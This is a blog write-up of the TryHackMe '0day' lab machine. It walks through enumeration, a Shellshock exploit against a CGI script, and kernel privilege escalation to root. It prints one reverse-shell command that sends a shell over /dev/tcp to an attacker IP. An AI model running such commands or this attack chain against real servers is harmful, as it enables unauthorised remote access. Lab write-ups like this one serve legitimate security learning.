---
title: 0day - TryHackMe
author: Sujit Suryawanshi
date: 2020-11-09 15:10:00 +0800
categories: [TryHackMe]
tags: [tryhackme, 0day, shellshock]
---

<h3 data-toc-skip>0day - TryHackMe</h3>


![Desktop View]({{ "/assets/img/thm-machines/0day-main.png" | relative_url }})

Hey All, Hope you all are safe and doing well. Today I'm gonna do 0day machine by Ryan Montgomery on TryHackMe.It's really good machine on ShellShock Vulnerability which is available in cgi-bin directory with test.cgi file name and the Privilage Escalation is also awesome because of the old kernel version.

So what is exactly ShellShock Vulnerability?

As per NetSparker, Shellshock is a security bug causing Bash to execute commands from environment variables unintentionally. In other words if exploited the vulnerability allows the attacker to remotely issue commands on the server, also known as remote code execution.
Since the environment variables are not sanitized properly by Bash before being executed, the attacker can send commands to the server through HTTP requests and get them executed by the web server operating system.
The ShellShock Vulnerability, discovered by Stephane Chazelas was assigned the CVE identifier CVE-2014-6271.

Now let's go for practical to understand and hack this machine.

**This blog is meant for educational purposes only.**

---

First starting with Nmap, I found two open ports that is Port 22 and Port 80. Here Port 22 is running OpenSSH 6.6.1p1 service and Port 80 is running Apache - 2.4.7 service on Ubuntu Operating System.

![Desktop View]({{ "/assets/img/thm-machines/0day-nmap.png" | relative_url }})

For further enumeration, I moved to Port 80 to check which kind of web application is running.

![Desktop View]({{ "/assets/img/thm-machines/0day-website.png" | relative_url }})

So the web application was static. Lets run Dirsearch with common.txt to discover more content/directories of this web application.
On other hand I started Nikto on this web application to identify common vulnerabilities.

The Dirsearch gave me below result which contains a lot of sensitive directories.

![Desktop View]({{ "/assets/img/thm-machines/0day-dirsearch.png" | relative_url }})

I started visiting one by one to enumerate and to find something fruitful.

In **/admin** directory, I got nothing and it was totally blank page so I moved towards **/backup** directory and it gave me Private SSH key.

![Desktop View]({{ "/assets/img/thm-machines/0day-ssh-key.png" | relative_url }})

Next, I saved that key and tried to login into server with different usernames such as root, admin, ryan etc but none them worked. The SSH key was asking password to login and I was doubting on this SSH key as it can be rabbit hole.

![Desktop View]({{ "/assets/img/thm-machines/0day-ssh-error.png" | relative_url }})

At last I moved further to enumerate other directories of web application.

But before that I checked Nikto's result and it gave me a lot of hints.

![Desktop View]({{ "/assets/img/thm-machines/0day-nikto.png" | relative_url }})

In above screenshot you can see Nikto gave one uncommon header which is actually a CVE id of ShellShock Vulnerability and also it gave /cgi-bin/test.cgi file.
For exploitation, I googled CVE id and checked one Github page there I got Oneliner to test and confirm the ShellShock Vulnerability.

![Desktop View]({{ "/assets/img/thm-machines/0day-github.png" | relative_url }})

After trying above Oneliner, I confirmed the ShellShock Vulnerability and continued to get reverse shell of server.

![Desktop View]({{ "/assets/img/thm-machines/0day-oneliner.png" | relative_url }})

After using Onliner with **sh>&/dev/tcp/10.10.10.10/1337 0>&1** command, I got initial shell. Here we are redirecting the output of bash on 10.10.10.10 with Port 1337 using /dev/tcp connection.

![Desktop View]({{ "/assets/img/thm-machines/0day-reverse-shell.png" | relative_url }})

Now it's time to upgrade our shell and start enumeration to get higher privileged user.

I used python tty and set PATH environment to upgrade my shell.

After going to **/home** directory I got **ryan** user and also I was able to read his flag as the read permission was given.

![Desktop View]({{ "/assets/img/thm-machines/0day-user-flag.png" | relative_url }})

After running **LinPeas.sh** for Privilege Escalation, I got vulnerable Linux Kernel version.

![Desktop View]({{ "/assets/img/thm-machines/0day-linpeas.png" | relative_url }})

Here SearchSploit helped me to get the exploit.

![Desktop View]({{ "/assets/img/thm-machines/0day-searchsploit.png" | relative_url }})

After running the exploit, I got the root!!!

![Desktop View]({{ "/assets/img/thm-machines/0day-root-flag.png" | relative_url }})

If you want detailed explanation about this Privilage Escalation vulnerability then go [here](https://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/)

Thanks for reading this writeup and all suggestions are welcome.
